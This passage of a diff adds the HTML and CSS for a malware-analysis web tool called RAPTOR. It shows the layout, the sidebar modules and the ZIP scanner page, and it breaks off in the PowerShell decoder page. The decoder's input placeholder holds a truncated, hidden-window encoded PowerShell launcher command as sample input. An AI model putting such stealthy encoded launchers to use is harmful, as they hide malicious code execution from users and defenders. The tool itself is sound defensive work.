@@ -1,0 +1,3106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RAPTOR – Mini Threat Analyzer</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&family=IBM+Plex+Mono:wght@400;500;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer"/>
+<style>
+:root{
+  --bg:#eef3ff;--s1:#ffffff;--s2:#f5f8ff;--s3:#edf2fc;
+  --b1:#d8e4f5;--b2:#bdd0ea;--b3:#9eb8da;
+  --c:#0052b4;--g:#007a3d;--r:#c8102e;--o:#b84d00;--y:#9a6200;--p:#5a1fa0;
+  --tx:#1a2840;--dim:#8aa0bc;--dim2:#507090;
+  --fm:'IBM Plex Mono',monospace;--ft:'IBM Plex Sans',sans-serif;--fo:'Orbitron',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}
+body{background:linear-gradient(135deg,#ddeaff 0%,#eef3ff 25%,#f5f8ff 60%,#e8f0ff 100%);background-attachment:fixed;color:var(--tx);font-family:var(--ft);font-size:14px;line-height:1.5;min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;z-index:0;
+  background:radial-gradient(ellipse 70% 50% at 10% 0%,rgba(0,100,220,.06) 0%,transparent 60%),
+  radial-gradient(ellipse 50% 40% at 90% 100%,rgba(80,0,200,.05) 0%,transparent 55%),
+  linear-gradient(rgba(0,82,180,.012) 1px,transparent 1px) 0 0/50px 50px,
+  linear-gradient(90deg,rgba(0,82,180,.012) 1px,transparent 1px) 0 0/50px 50px;pointer-events:none}
+body::after{content:'';position:fixed;inset:0;z-index:1;
+  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,50,120,.012) 3px,rgba(0,50,120,.012) 4px);pointer-events:none}
+.app{position:relative;z-index:2;display:flex;flex-direction:column;min-height:100vh}
+
+/* HEADER */
+header{display:flex;align-items:center;justify-content:space-between;padding:13px 22px;
+  background:rgba(255,255,255,.96);border-bottom:1px solid var(--b2);backdrop-filter:blur(16px);
+  position:sticky;top:0;z-index:100;gap:12px;flex-wrap:wrap;box-shadow:0 2px 20px rgba(0,82,180,.10)}
+.logo{display:flex;align-items:center;gap:13px}
+.shield{width:40px;height:40px;border:2px solid var(--c);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:19px;animation:shP 3s infinite;flex-shrink:0}
+@keyframes shP{0%,100%{box-shadow:0 0 8px rgba(0,82,180,.25)}50%{box-shadow:0 0 24px rgba(0,82,180,.6)}}
+.logo-text h1{font-family:var(--fo);font-size:.9rem;font-weight:900;color:var(--c);letter-spacing:.25em}
+.logo-text p{font-size:.5625rem;color:var(--dim2);letter-spacing:.15em;margin-top:3px;font-family:var(--ft);font-weight:500}
+.hdr-right{display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+.hstat{text-align:center}.hstat-n{font-family:var(--fo);font-size:.9rem;font-weight:900;display:block}
+.hstat-l{font-size:.5rem;letter-spacing:.12em;color:var(--dim2);font-family:var(--ft);font-weight:500}
+.live{display:flex;align-items:center;gap:6px;font-size:.5625rem;letter-spacing:.1em;font-family:var(--ft);font-weight:500}
+.blink{width:7px;height:7px;border-radius:50%;animation:blk 1.3s infinite}
+@keyframes blk{0%,100%{opacity:1;box-shadow:0 0 6px currentColor}50%{opacity:.2;box-shadow:none}}
+.live.online{color:var(--g)}.live.online .blink{background:var(--g)}
+.live.offline{color:var(--r)}.live.offline .blink{background:var(--r)}
+.vtag{font-family:var(--ft);font-size:.5625rem;font-weight:600;letter-spacing:.1em;color:var(--c);border:1px solid rgba(0,82,180,.3);padding:3px 10px;background:rgba(0,82,180,.07);border-radius:3px}
+
+/* LAYOUT */
+.main{display:flex;flex:1;overflow:hidden}
+.sidebar{width:220px;flex-shrink:0;background:rgba(255,255,255,.99);border-right:1px solid var(--b1);
+  display:flex;flex-direction:column;height:calc(100vh - 67px);position:sticky;top:67px;overflow-y:auto}
+.content{flex:1;overflow-y:auto;padding:20px;max-height:calc(100vh - 67px)}
+
+/* SIDEBAR */
+.sb-sec{padding:16px 16px 5px;font-size:.6rem;letter-spacing:.12em;color:var(--dim);text-transform:uppercase;
+  font-family:var(--ft);font-weight:600}
+.sb-item{display:flex;align-items:center;gap:10px;padding:9px 16px;cursor:pointer;transition:all .15s;
+  font-family:var(--ft);font-size:.8125rem;font-weight:500;color:#5c7a9e;border-left:3px solid transparent;
+  line-height:1.25}
+.sb-item:hover{color:var(--c);background:rgba(0,82,180,.05);border-left-color:rgba(0,82,180,.3)}
+.sb-item.active{color:var(--c);background:rgba(0,82,180,.08);border-left-color:var(--c);font-weight:600}
+.sb-icon{width:16px;text-align:center;flex-shrink:0;font-size:.75rem;opacity:.7;transition:opacity .15s}
+.sb-item:hover .sb-icon,.sb-item.active .sb-icon{opacity:1}
+.sb-div{height:1px;background:var(--b1);margin:6px 14px}
+/* SIDEBAR BADGE */
+.sb-badge-new{margin-left:auto;font-size:.5rem;font-family:var(--ft);font-weight:700;letter-spacing:.06em;
+  background:var(--g);color:#fff;padding:2px 6px;border-radius:3px;text-transform:uppercase}
+.hist-list{padding:0 7px 7px}
+.hi{padding:7px 8px;background:rgba(0,82,180,.04);border:1px solid var(--b1);border-radius:4px;margin-bottom:5px;cursor:pointer;transition:all .15s;font-size:.66rem}
+.hi:hover{border-color:var(--b3);background:rgba(0,82,180,.06)}
+.hi-type{font-size:.5625rem;letter-spacing:.06em;color:var(--dim2);margin-bottom:2px;font-family:var(--ft);font-weight:500;text-transform:uppercase}
+.hi-name{color:var(--tx);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:2px}
+.hi-risk{font-family:var(--fo);font-size:.54rem;font-weight:700}
+.hi-risk.low{color:var(--g)}.hi-risk.medium{color:var(--o)}.hi-risk.high{color:var(--r)}
+.hi-time{font-size:.5rem;color:var(--dim)}
+.no-hist{font-size:.66rem;color:var(--dim);padding:9px 8px;text-align:center}
+
+/* PANELS */
+.panel{background:rgba(255,255,255,.92);border:1px solid var(--b2);border-radius:6px;overflow:hidden;box-shadow:0 2px 12px rgba(0,60,160,.07)}
+.ph{padding:10px 16px;background:rgba(0,82,180,.04);border-bottom:1px solid var(--b1);
+  display:flex;align-items:center;gap:8px;font-family:var(--ft);font-size:.6875rem;font-weight:600;
+  color:var(--c);letter-spacing:.1em;text-transform:uppercase}
+.pb2{padding:17px}.panel+.panel{margin-top:13px}
+
+/* INPUTS */
+.ig{margin-bottom:11px}
+label{display:block;font-size:.625rem;letter-spacing:.1em;text-transform:uppercase;color:var(--dim2);margin-bottom:6px;font-family:var(--ft);font-weight:600}
+input[type=text],textarea{width:100%;background:rgba(255,255,255,.9);border:1px solid var(--b2);padding:10px 13px;color:var(--tx);font-family:var(--fm);font-size:.8125rem;outline:none;transition:border-color .2s,box-shadow .2s;border-radius:4px}
+input:focus,textarea:focus{border-color:var(--c);box-shadow:0 0 0 3px rgba(0,82,180,.12)}
+textarea{resize:vertical;min-height:90px;line-height:1.6}
+
+/* DROPZONE */
+.dz{border:2px dashed var(--b2);padding:32px 18px;text-align:center;cursor:pointer;transition:all .24s;position:relative;background:rgba(0,82,180,.03);border-radius:8px}
+
+/* PS INPUT TABS */
+.ps-tabs{display:flex;gap:6px;margin-bottom:14px;border-bottom:1px solid var(--b1);padding-bottom:10px}
+.ps-tab{padding:7px 18px;border:1px solid var(--b2);background:transparent;color:var(--dim2);font-family:var(--ft);font-size:.66rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;border-radius:4px 4px 0 0;transition:all .18s}
+.ps-tab:hover{border-color:var(--c);color:var(--c);background:rgba(0,82,180,.05)}
+.ps-tab.active{border-color:var(--c);color:var(--c);background:rgba(0,82,180,.09);border-bottom-color:var(--s1)}
+/* PS file info strip */
+.ps-file-info{margin-top:10px}
+/* enhanced indicator context line */
+.ii-ctx{font-size:.56rem;color:var(--dim2);margin-top:3px;padding:3px 6px;background:rgba(0,0,0,.03);border-left:2px solid var(--b2);font-family:var(--fm);word-break:break-all}
+.dz:hover,.dz.drag{border-color:var(--c);background:rgba(0,82,180,.05);box-shadow:0 0 20px rgba(0,82,180,.12)}
+.dz input{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%}
+.dz-ic{font-size:2.2rem;display:block;margin-bottom:8px;filter:drop-shadow(0 0 8px rgba(0,232,255,.35))}
+.dz-t{font-family:var(--fo);font-size:.7rem;letter-spacing:3px;color:var(--c);margin-bottom:5px}
+.dz-s{font-size:.58rem;color:var(--dim2);letter-spacing:1px}
+.dz-fn{font-size:.6rem;color:var(--c);margin-top:8px;display:none}
+
+/* BUTTONS */
+.brow{display:flex;gap:8px;flex-wrap:wrap;margin-top:13px}
+.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 18px;background:transparent;
+  border:1px solid var(--c);color:var(--c);font-family:var(--ft);font-weight:600;font-size:.6875rem;
+  letter-spacing:.08em;text-transform:uppercase;cursor:pointer;transition:all .18s;
+  clip-path:polygon(0 0,calc(100% - 8px) 0,100% 8px,100% 100%,8px 100%,0 calc(100% - 8px))}
+.btn:hover{background:rgba(0,82,180,.1);box-shadow:0 2px 12px rgba(0,82,180,.22)}
+.btn:active{transform:scale(.97)}
+.btn-r{border-color:var(--r);color:var(--r)}.btn-r:hover{background:rgba(255,32,96,.1)}
+.btn-g{border-color:var(--g);color:var(--g)}.btn-g:hover{background:rgba(0,255,127,.08)}
+.btn-p{border-color:var(--p);color:var(--p)}.btn-p:hover{background:rgba(192,96,255,.1)}
+.btn-o{border-color:var(--o);color:var(--o)}.btn-o:hover{background:rgba(255,120,0,.1)}
+
+/* LOADING */
+.ld{display:none;padding:26px;text-align:center}.ld.on{display:block}
+.sp{display:inline-block;width:34px;height:34px;border:3px solid var(--b1);border-top-color:var(--c);border-radius:50%;animation:sp .75s linear infinite;margin-bottom:11px}
+@keyframes sp{to{transform:rotate(360deg)}}
+.lm{font-family:var(--ft);font-size:.6875rem;font-weight:500;letter-spacing:.12em;color:var(--c);animation:fad 1s infinite}
+@keyframes fad{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* RISK */
+.risk-wrap{margin:16px 0 6px}
+.rk{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;border:1px solid;border-radius:2px;gap:10px}
+.rk.low{border-color:var(--g);background:rgba(0,255,127,.04)}
+.rk.medium{border-color:var(--o);background:rgba(255,120,0,.04)}
+.rk.high{border-color:var(--r);background:rgba(255,32,96,.05);animation:rkP 2s infinite}
+@keyframes rkP{0%,100%{box-shadow:none}50%{box-shadow:0 0 26px rgba(255,32,96,.22)}}
+.rk-l{font-size:.625rem;letter-spacing:.1em;color:var(--dim2);margin-bottom:4px;font-family:var(--ft);font-weight:500;text-transform:uppercase}
+.rk-v{font-family:var(--fo);font-size:1.7rem;font-weight:900;letter-spacing:5px}
+.rk.low .rk-v{color:var(--g);text-shadow:0 0 12px var(--g)}
+.rk.medium .rk-v{color:var(--o);text-shadow:0 0 12px var(--o)}
+.rk.high .rk-v{color:var(--r);text-shadow:0 0 12px var(--r)}
+.rk-r{text-align:right;flex-shrink:0}
+.rk-n{font-family:var(--fo);font-size:1.4rem;font-weight:900}
+.rk.low .rk-n{color:var(--g)}.rk.medium .rk-n{color:var(--o)}.rk.high .rk-n{color:var(--r)}
+.rk-sl{font-size:.5625rem;color:var(--dim2);letter-spacing:.08em;display:block;margin-top:3px;font-family:var(--ft);font-weight:500}
+.rk-sub{font-size:.58rem;color:var(--p);margin-top:4px;font-family:var(--ft)}
+
+/* PROGRESS */
+.pw{height:4px;background:rgba(0,0,0,.5);border-radius:2px;overflow:hidden;margin-bottom:18px}
+.pbar{height:100%;border-radius:2px;width:0;transition:width .7s cubic-bezier(.22,1,.36,1)}
+.pbl{background:linear-gradient(90deg,var(--g),#60ffaa)}.pbm{background:linear-gradient(90deg,var(--o),#ffc000)}.pbh{background:linear-gradient(90deg,var(--r),#ff8000)}
+
+/* SECTION */
+.sec{margin-bottom:18px}
+.st{font-size:.625rem;letter-spacing:.1em;text-transform:uppercase;color:var(--dim2);margin-bottom:8px;display:flex;align-items:center;gap:8px;font-family:var(--ft);font-weight:600}
+.st::after{content:'';flex:1;height:1px;background:var(--b1)}
+
+/* GRID */
+.mg{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px}
+.mc{background:rgba(255,255,255,.85);border:1px solid var(--b1);padding:10px 12px;border-radius:4px}
+.ml{font-size:.5625rem;letter-spacing:.08em;color:var(--dim2);margin-bottom:4px;font-family:var(--ft);font-weight:500;text-transform:uppercase}
+.mv{font-size:.77rem;word-break:break-all;line-height:1.4}
+.mv.ok{color:var(--g)}.mv.warn{color:var(--o)}.mv.bad{color:var(--r)}.mv.info{color:var(--c)}.mv.pu{color:var(--p)}
+
+/* INDICATORS */
+.il{list-style:none}
+.ii{display:flex;align-items:flex-start;gap:8px;padding:9px 13px;border-bottom:1px solid var(--b1);font-size:.8125rem;font-family:var(--ft);line-height:1.5}
+.ii:last-child{border-bottom:none}.ii:hover{background:rgba(0,82,180,.03)}
+.tag{display:inline-block;padding:2px 7px;font-size:.5rem;font-weight:700;letter-spacing:.06em;text-transform:uppercase;flex-shrink:0;margin-top:2px;font-family:var(--ft)}
+.tc{background:rgba(192,96,255,.15);border:1px solid var(--p);color:var(--p)}
+.th{background:rgba(255,32,96,.15);border:1px solid var(--r);color:var(--r)}
+.tm{background:rgba(255,120,0,.12);border:1px solid var(--o);color:var(--o)}
+.tl{background:rgba(0,255,127,.08);border:1px solid var(--g);color:var(--g)}
+.ti{background:rgba(0,232,255,.08);border:1px solid var(--c);color:var(--c)}
+.ii-body{flex:1}.ii-mitre{font-size:.54rem;color:var(--p);margin-top:2px;font-family:var(--ft)}
+
+/* MITRE */
+.mitre-grid{display:flex;flex-wrap:wrap;gap:6px}
+.mt{padding:5px 10px;border:1px solid var(--b2);background:rgba(90,31,160,.06);border-radius:4px}
+.mt:hover{border-color:var(--p);background:rgba(192,96,255,.12)}
+.mt-id{font-family:var(--fo);font-size:.55rem;color:var(--p)}
+.mt-name{font-size:.6875rem;color:var(--tx);font-family:var(--ft);font-weight:600}
+.mt-tac{font-size:.5625rem;color:var(--dim2);font-family:var(--ft);font-weight:400}
+
+/* IOC */
+.ioc-grid{display:grid;grid-template-columns:1fr 1fr;gap:9px}
+@media(max-width:700px){.ioc-grid{grid-template-columns:1fr}}
+.ioc-cat{background:rgba(255,255,255,.88);border:1px solid var(--b1);border-radius:5px;overflow:hidden}
+.ioc-hdr{padding:6px 11px;background:rgba(0,82,180,.05);border-bottom:1px solid var(--b1);font-size:.54rem;letter-spacing:2px;color:var(--c);font-family:var(--ft);text-transform:uppercase}
+.ioc-item{padding:5px 11px;font-size:.68rem;border-bottom:1px solid rgba(17,30,56,.5);word-break:break-all;color:var(--tx);display:flex;align-items:center;gap:6px}
+.ioc-item:last-child{border-bottom:none}.ioc-item::before{content:'›';color:var(--c);flex-shrink:0}
+
+/* MONO */
+.mono{background:rgba(240,245,255,.95);border:1px solid var(--b2);border-left:3px solid var(--c);
+  padding:12px 14px;font-size:.71rem;white-space:pre-wrap;word-break:break-all;
+  max-height:200px;overflow-y:auto;border-radius:4px;line-height:1.7;color:#1a4060}
+.mono.bad{border-left-color:var(--r);color:#ff9090}.mono.warn{border-left-color:var(--o);color:#ffb060}
+.kw-c{color:var(--r);font-weight:700}.kw-h{color:var(--o);font-weight:700}.kw-m{color:var(--y)}
+.kw-s{color:#007850}.kw-cm{color:#708090;font-style:italic}.kw-flag{color:var(--c)}
+
+/* ENTROPY */
+.ent-wrap{display:flex;align-items:center;gap:10px;margin-top:4px}
+.ent-bw{flex:1;height:7px;background:rgba(0,0,0,.4);border-radius:4px;overflow:hidden;border:1px solid var(--b1)}
+.ent-b{height:100%;border-radius:4px;transition:width .7s ease}
+.ent-v{font-family:var(--fo);font-size:.66rem;flex-shrink:0;width:36px;text-align:right}
+.ent-l{font-size:.54rem;color:var(--dim2);flex-shrink:0;width:70px;font-family:var(--ft)}
+
+/* FILE TREE */
+.ftree{list-style:none}
+.fti{display:flex;align-items:center;gap:7px;padding:7px 11px;border-bottom:1px solid rgba(17,30,56,.6);cursor:pointer;transition:all .14s;font-size:.72rem}
+.fti:hover{background:rgba(0,82,180,.04)}.fti.sel{background:rgba(0,82,180,.09);border-left:2px solid var(--c)}
+.fti-ic{flex-shrink:0}.fti-n{flex:1;word-break:break-all}
+.fti-n.bad{color:var(--r)}.fti-n.warn{color:var(--o)}.fti-n.ok{color:var(--g)}
+.fti-sz{font-size:.56rem;color:var(--dim2);flex-shrink:0}
+.fti-sc{font-family:var(--fo);font-size:.58rem;flex-shrink:0}
+.fb{font-size:.48px;padding:1px 5px;font-family:var(--fo);letter-spacing:1px;flex-shrink:0}
+
+/* STATS ROW */
+.srow{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}
+.sb2{flex:1;min-width:88px;background:rgba(0,0,0,.35);border:1px solid var(--b1);padding:11px 8px;text-align:center;border-radius:1px;border-top:2px solid}
+.sb2 .sn{font-family:var(--fo);font-size:1.35rem;font-weight:900;display:block}
+.sb2 .sl{font-size:.48rem;letter-spacing:2px;color:var(--dim2);margin-top:2px;display:block;font-family:var(--ft)}
+
+/* VT BOX */
+.vt-box{padding:10px 14px;background:rgba(0,0,0,.3);border:1px solid var(--b2);border-radius:2px;margin-top:10px;font-size:.74rem}
+.vt-box.clean{border-color:var(--g)}.vt-box.dirty{border-color:var(--r)}.vt-box.unknown{border-color:var(--dim2)}
+.vt-label{font-size:.52rem;letter-spacing:2px;color:var(--dim2);font-family:var(--ft);margin-bottom:4px}
+
+/* REDIRECT */
+.rc-item{display:flex;align-items:flex-start;gap:8px;padding:6px 0;border-bottom:1px solid var(--b1)}
+.rc-item:last-child{border-bottom:none}
+.rc-step{font-size:.55rem;color:var(--dim2);background:rgba(0,0,0,.3);border:1px solid var(--b1);padding:2px 6px;flex-shrink:0;font-family:var(--fo)}
+.rc-url{font-size:.71rem;word-break:break-all;flex:1}
+.rc-note{font-size:.57rem;color:var(--o);margin-top:2px}
+
+/* RESULTS */
+.res{display:none}.res.on{display:block;animation:fU .35s ease}
+@keyframes fU{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.fd{display:none}.fd.on{display:block;animation:fU .3s ease}
+
+/* REPORT */
+.report-area{background:rgba(0,0,0,.4);border:1px solid var(--b2);padding:16px;border-radius:2px;font-size:.72rem;line-height:2;white-space:pre-wrap;word-break:break-all;max-height:360px;overflow-y:auto}
+
+/* AI STYLES */
+.ai-mode-btn{padding:7px 14px;border:1px solid var(--b2);background:rgba(0,0,0,.3);color:var(--dim2);font-family:var(--ft);font-size:.72rem;font-weight:600;cursor:pointer;border-radius:2px;transition:all .15s}
+.ai-mode-btn:hover{border-color:var(--p);color:var(--p);background:rgba(192,96,255,.08)}
+.ai-mode-btn.active{border-color:var(--p);color:var(--p);background:rgba(192,96,255,.12)}
+.ai-quick-btn{padding:6px 13px;border:1px solid var(--b2);background:rgba(0,0,0,.3);color:var(--dim2);font-family:var(--ft);font-size:.68rem;font-weight:600;cursor:pointer;border-radius:2px;transition:all .15s}
+.ai-quick-btn:hover{border-color:var(--c);color:var(--c);background:rgba(0,232,255,.06)}
+.ai-typing::after{content:'▋';animation:blk 0.8s infinite;color:var(--p)}
+.ai-risk-high{padding:14px 18px;border:1px solid var(--r);background:rgba(255,32,96,.06);border-radius:2px;display:flex;align-items:center;gap:14px}
+.ai-risk-med{padding:14px 18px;border:1px solid var(--o);background:rgba(255,120,0,.06);border-radius:2px;display:flex;align-items:center;gap:14px}
+.ai-risk-low{padding:14px 18px;border:1px solid var(--g);background:rgba(0,255,127,.04);border-radius:2px;display:flex;align-items:center;gap:14px}
+.chat-msg{padding:8px 12px;margin-bottom:8px;border-radius:2px;font-size:.74rem;line-height:1.7}
+.chat-user{background:rgba(0,232,255,.06);border-left:3px solid var(--c);color:var(--tx)}
+.chat-ai{background:rgba(192,96,255,.06);border-left:3px solid var(--p);color:var(--tx);white-space:pre-wrap}
+
+/* TOAST */
+#toast{position:fixed;bottom:20px;right:20px;z-index:999;display:flex;flex-direction:column;gap:6px}
+.toast-item{padding:9px 15px;background:var(--s2);border:1px solid var(--b3);font-size:.68rem;letter-spacing:1px;animation:toastIn .25s ease;font-family:var(--ft);box-shadow:0 4px 18px rgba(0,0,0,.5)}
+@keyframes toastIn{from{opacity:0;transform:translateX(14px)}to{opacity:1;transform:translateX(0)}}
+.toast-g{border-color:var(--g);color:var(--g)}.toast-r{border-color:var(--r);color:var(--r)}.toast-c{border-color:var(--c);color:var(--c)}.toast-o{border-color:var(--o);color:var(--o)}
+
+/* API MODE BANNER */
+.mode-banner{display:flex;align-items:center;gap:8px;padding:6px 14px;font-size:.6rem;letter-spacing:1px;font-family:var(--ft);border-bottom:1px solid var(--b1)}
+.mode-banner.api{background:rgba(0,255,127,.06);color:var(--g)}
+.mode-banner.local{background:rgba(255,120,0,.06);color:var(--o)}
+
+@media(max-width:900px){.sidebar{display:none}.content{padding:13px}}
+::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--b2);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:var(--c)}
+</style>
+</head>
+<body>
+<div class="app">
+
+<header>
+  <div class="logo">
+    <div class="shield" style="background:linear-gradient(135deg,rgba(0,82,180,.12),rgba(0,82,180,.05));font-size:22px;">🦅</div>
+    <div class="logo-text">
+      <h1 style="font-size:1rem;letter-spacing:3px;">RAPTOR</h1>
+      <p style="font-size:.52rem;letter-spacing:2px;color:var(--dim2);font-family:var(--ft);margin-top:1px;">THREAT ANALYZER</p>
+      
+    </div>
+  </div>
+  <div class="hdr-right">
+    <div class="hstat"><span class="hstat-n" id="hScans" style="color:var(--c)">0</span><span class="hstat-l">SCANS</span></div>
+    <div class="hstat"><span class="hstat-n" id="hThreats" style="color:var(--r)">0</span><span class="hstat-l">THREATS</span></div>
+    <div class="hstat"><span class="hstat-n" id="hIOCs" style="color:var(--o)">0</span><span class="hstat-l">IOCs</span></div>
+    <div class="live" id="modeLive"><div class="blink"></div><span id="modeText">CHECKING...</span></div>
+    
+  </div>
+</header>
+
+<div id="modeBanner" class="mode-banner local">⚡ Running in LOCAL mode — start Flask backend for persistent DB storage</div>
+
+<div class="main">
+  <div class="sidebar">
+    <div class="sb-sec">Modules</div>
+    <div class="sb-item active" onclick="showPage('zip')" id="nav-zip"><span class="sb-icon"><i class="fa-regular fa-file-zipper"></i></span>ZIP Scanner</div>
+    <div class="sb-item" onclick="showPage('ps')" id="nav-ps"><span class="sb-icon"><i class="fa-solid fa-terminal"></i></span>PS Decoder</div>
+    <div class="sb-item" onclick="showPage('url')" id="nav-url"><span class="sb-icon"><i class="fa-solid fa-link"></i></span>URL Analyzer</div>
+    <div class="sb-div"></div>
+    <div class="sb-sec">Tools</div>
+    <div class="sb-item" onclick="showPage('eml')" id="nav-eml"><span class="sb-icon"><i class="fa-regular fa-envelope"></i></span>Email Scanner</div>
+    <div class="sb-item" onclick="showPage('headers')" id="nav-headers"><span class="sb-icon"><i class="fa-solid fa-list-ul"></i></span>Header Analyzer</div>
+    <div class="sb-item" onclick="showPage('whois')" id="nav-whois"><span class="sb-icon"><i class="fa-solid fa-earth-americas"></i></span>WHOIS / Age</div>
+    <div class="sb-item" onclick="showPage('hash')" id="nav-hash"><span class="sb-icon"><i class="fa-solid fa-fingerprint"></i></span>Hash Lookup</div>
+    <div class="sb-item" onclick="showPage('ioc')" id="nav-ioc"><span class="sb-icon"><i class="fa-solid fa-crosshairs"></i></span>IOC Extractor</div>
+    <div class="sb-item" onclick="showPage('dashboard')" id="nav-dashboard"><span class="sb-icon"><i class="fa-solid fa-chart-pie"></i></span>Dashboard</div>
+    <div class="sb-item" onclick="showPage('report')" id="nav-report"><span class="sb-icon"><i class="fa-regular fa-file-lines"></i></span>Report Export</div>
+    <div class="sb-div"></div>
+    <div class="sb-sec">Scan History</div>
+    <div class="hist-list" id="histList"><div class="no-hist">No scans yet</div></div>
+  </div>
+
+  <div class="content">
+
+    <!-- ZIP PAGE -->
+    <div class="page" id="page-zip">
+      <div class="panel">
+        <div class="ph">📦 ZIP SCANNER — EXTRACT · DECODE · ENTROPY · IOC · MITRE</div>
+        <div class="pb2">
+          <div class="dz" id="dz" ondragover="dzDrag(event,true)" ondragleave="dzDrag(event,false)" ondrop="dzDrop(event)">
+            <input type="file" accept=".zip" onchange="handleZip(this.files[0])">
+            <span class="dz-ic">📦</span>
+            <div class="dz-t">DROP ZIP FILE HERE</div>
+            <div class="dz-s">click to browse · auto-decode all files · entropy scoring · IOC extraction</div>
+          </div>
+          <div class="dz-fn" id="dzFn"></div>
+          <div class="brow"><button class="btn btn-r" onclick="clearZip()">✕ CLEAR</button></div>
+        </div>
+      </div>
+      <div class="ld" id="zipLd"><div class="sp"></div><div class="lm" id="zipLm">EXTRACTING...</div></div>
+      <div class="res" id="zipRes">
+        <div class="srow" style="margin-top:16px">
+          <div class="sb2" style="border-top-color:var(--c)"><span class="sn" id="zTotal" style="color:var(--c)">0</span><span class="sl">FILES</span></div>
+          <div class="sb2" style="border-top-color:var(--r)"><span class="sn" id="zThreats" style="color:var(--r)">0</span><span class="sl">THREATS</span></div>
+          <div class="sb2" style="border-top-color:var(--o)"><span class="sn" id="zScripts" style="color:var(--o)">0</span><span class="sl">SCRIPTS</span></div>
+          <div class="sb2" style="border-top-color:var(--p)"><span class="sn" id="zEnc" style="color:var(--p)">0</span><span class="sl">ENCODED</span></div>
+          <div class="sb2" style="border-top-color:var(--r)"><span class="sn" id="zExe" style="color:var(--r)">0</span><span class="sl">EXE</span></div>
+          <div class="sb2" style="border-top-color:var(--y)"><span class="sn" id="zIOC" style="color:var(--y)">0</span><span class="sl">IOCs</span></div>
+        </div>
+        <div class="risk-wrap">
+          <div id="zRK" class="rk low">
+            <div><div class="rk-l">OVERALL THREAT LEVEL</div><div class="rk-v" id="zRV">LOW</div><div class="rk-sub" id="zMitre"></div></div>
+            <div class="rk-r"><div class="rk-n" id="zSN">0</div><span class="rk-sl">RISK SCORE / 100</span></div>
+          </div>
+        </div>
+        <div class="pw"><div class="pbar" id="zPB"></div></div>
+        <div class="sec"><div class="st">📁 ARCHIVE CONTENTS</div><div class="panel"><ul class="ftree" id="ftree"></ul></div></div>
+        <div class="fd" id="fDetail">
+          <div class="sec">
+            <div class="st">🔬 FILE DETAIL — <span id="fdName" style="color:var(--c)"></span></div>
+            <div class="mg" id="fdMeta" style="margin-bottom:11px"></div>
+            <div class="st">📊 ENTROPY</div><div id="fdEntropy" style="margin-bottom:11px"></div>
+            <div class="st">💻 DECODED CONTENT</div><div class="mono" id="fdContent"></div>
+            <div style="margin-top:11px"><div class="st">⚔️ MITRE ATT&CK</div><div class="mitre-grid" id="fdMitre"></div></div>
+            <div style="margin-top:11px"><div class="st">🚨 INDICATORS</div><div class="panel"><ul class="il" id="fdInds"></ul></div></div>
+          </div>
+        </div>
+        <div class="sec"><div class="st">🚨 ARCHIVE INDICATORS</div><div class="panel"><ul class="il" id="zInds"></ul></div></div>
+        <div class="sec"><div class="st">🔍 EXTRACTED IOCs</div><div class="ioc-grid" id="zIOCs"></div></div>
+        <div class="brow" id="zPdfRow" style="display:none">
+          <button class="btn btn-g" onclick="exportPDF('zip')">📄 EXPORT PDF REPORT</button>
+        </div>
+        <div style="font-size:.53rem;color:var(--dim2);text-align:right;margin-top:7px" id="zTS"></div>
+      </div>
+    </div>
+
+    <!-- PS PAGE -->
+    <div class="page" id="page-ps" style="display:none">
+      <div class="panel">
+        <div class="ph">⚡ POWERSHELL DECODER — FILE UPLOAD · MULTI-LAYER · ENTROPY · MITRE · IOC</div>
+        <div class="pb2">
+          <!-- INPUT MODE TABS -->
+          <div class="ps-tabs">
+            <button class="ps-tab active" id="psTabText" onclick="switchPSTab('text')">⌨️ TEXT INPUT</button>
+            <button class="ps-tab" id="psTabFile" onclick="switchPSTab('file')">📂 FILE UPLOAD</button>
+          </div>
+
+          <!-- TEXT INPUT PANE -->
+          <div id="psTextPane">
+            <div class="ig"><label>PowerShell Command / Encoded Payload</label>
+              <textarea id="psIn" placeholder="powershell -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAA...&#10;Paste any script, encoded command, or log excerpt containing PowerShell…"></textarea>
+            </div>
+          </div>
+
+          <!-- FILE UPLOAD PANE -->
+          <div id="psFilePane" style="display:none">
+            <div class="ig"><label>Upload Script / Log File</label>
+              <div class="dz" id="psDZ" ondragover="event.preventDefault();this.classList.add('drag')" ondragleave="this.classList.remove('drag')" ondrop="psDrop(event)">
+                <input type="file" id="psFileIn" accept=".txt,.log,.ps1,.psm1,.psd1,.bat,.cmd,.vbs,.js,.hta,.py,.sh" onchange="psFileChosen(this)">
+                <span class="dz-ic">📜</span>
+                <div class="dz-t">DROP FILE HERE OR CLICK TO BROWSE</div>
+                <div class="dz-s">Supported: .txt · .log · .ps1 · .bat · .cmd · .vbs · .js · .hta · .py · .sh — Max 5 MB</div>
+                <div class="dz-fn" id="psDZFn"></div>
